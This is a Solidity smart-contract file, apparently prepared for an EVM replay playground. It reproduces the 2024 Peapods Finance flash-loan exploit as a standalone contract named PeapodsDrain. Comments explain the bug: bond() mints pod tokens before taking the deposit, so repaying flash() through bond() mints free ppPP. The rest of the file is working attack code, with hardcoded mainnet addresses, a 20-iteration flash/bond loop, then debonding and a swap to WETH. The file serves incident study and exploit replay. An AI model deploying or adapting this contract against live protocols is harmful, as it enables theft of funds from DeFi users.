// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-01-PeapodsFinance).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (`ContractTest` itself is the flash-loan recipient — `callback(bytes)` lives
// on the test, and `testExploit()` drives the 20x flash/bond loop), so there is
// no standalone attack contract to deploy. This is a faithful, self-contained
// copy of that inline attack (testExploit -> run, callback, PeasToWETH) so the
// playground can deploy it and record run(). Logic and constants are copied
// verbatim from test/PeapodsFinance_exp.sol.
//
// Root cause: the Peapods "ppPP" WeightedIndex pod's flash() lends out its own
// underlying (PEAS) and only checks that the PEAS balance is restored
// afterwards. bond() mints pod tokens BEFORE pulling in the deposited PEAS, so
// repaying the flash loan via bond() both restores the balance (satisfying
// flash()'s post-check) AND mints free ppPP to the attacker. Looping this 20x
// mints ~12,876 ppPP for only the flat 10 DAI/loop flash fee, which is then
// debonded and swapped out to WETH.

interface IERC20 {
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface IUniswapV3Router {
    struct ExactInputParams {
        bytes path;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
    }

    function exactInput(ExactInputParams memory params) external payable returns (uint256 amountOut);
}

interface IppPP is IERC20 {
    function flash(address _recipient, address _token, uint256 _amount, bytes memory _data) external;
    function bond(address _token, uint256 _amount) external;
    function debond(uint256 _amount, address[] memory, uint8[] memory) external;
}

contract PeapodsDrain {
    IERC20 private constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IppPP private constant ppPP = IppPP(0xdbB20A979a92ccCcE15229e41c9B082D5b5d7E31);
    IERC20 private constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 private constant Peas = IERC20(0x02f92800F57BCD74066F5709F1Daa1A4302Df875);
    IUniswapV3Router private constant Router = IUniswapV3Router(0xE592427A0AEce92De3Edee1F18E0157C05861564);

    // step 0: loop flash() -> bond() 20 times, then debond and swap the redeemed
    // PEAS out to WETH.
    function run() external {
        uint8 i;
        while (i < 20) {
            DAI.approve(address(ppPP), 10e18);
            ppPP.flash(address(this), address(Peas), Peas.balanceOf(address(ppPP)), "");
            ++i;
        }

        address[] memory token = new address[](1);
        token[0] = address(Peas);
        uint8[] memory percentage = new uint8[](1);
        percentage[0] = 100;
        ppPP.debond(ppPP.balanceOf(address(this)), token, percentage);
        PeasToWETH();
    }

    // flash() calls back into this via IFlashLoanRecipient.callback(bytes).
    // Depositing the just-borrowed PEAS via bond() both mints fresh ppPP to
    // this contract AND repays the flash loan in the same transfer.
    function callback(bytes calldata) external {
        Peas.approve(address(ppPP), Peas.balanceOf(address(this)));
        ppPP.bond(address(Peas), Peas.balanceOf(address(this)));
    }

    function PeasToWETH() internal {
        Peas.approve(address(Router), type(uint256).max);
        bytes memory _path = abi.encodePacked(address(Peas), hex"002710", address(DAI), hex"0001f4", address(WETH));
        IUniswapV3Router.ExactInputParams memory params = IUniswapV3Router.ExactInputParams({
            path: _path,
            recipient: address(this),
            deadline: block.timestamp + 1000,
            amountIn: Peas.balanceOf(address(this)),
            amountOutMinimum: 0
        });
        Router.exactInput(params);
    }
}
